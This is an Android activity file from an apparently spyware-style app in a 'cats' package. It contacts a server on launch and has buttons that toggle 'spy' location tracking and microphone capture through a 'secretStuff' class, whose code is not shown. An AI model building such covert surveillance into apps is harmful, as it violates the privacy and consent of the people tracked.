package com.example.cats;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.app.Activity;
import android.os.Bundle;
import android.view.Menu;
import android.widget.Button;
import android.view.View.OnClickListener;
import android.view.View;
import android.content.Context;


public class MainActivity extends Activity {

   
    Button gpsButton, micButton;
    boolean gpsOn = false;
    boolean micOn = false;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TalkToServer myAsync = new TalkToServer();
        System.out.println("********Test test test");
        myAsync.execute();
        System.out.println("^^^^^^^^Called execute to server.");
   
        //Set up spy code
        final secretStuff spy = new secretStuff();
        
        final Context context = this;
        gpsButton = (Button) this.findViewById(R.id.Button01);
        gpsButton.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		gpsOn = !gpsOn;//Toggle gps on off
        		if(gpsOn)spy.spyLocation(context, 0);
        		else {
        			spy.getLocation();
        			spy.stopLocationListen(context);
        		}
        	}
        });
        
        micButton = (Button) this.findViewById(R.id.Button02);
        micButton.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		micOn = !micOn;//Toggle gps on off
        		if(micOn)spy.spyMic();
        		else {
        			spy.stopMic();
        		}
        	}
        });
        
        //if(gpsOn) spy.getLocation();
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }
    
}
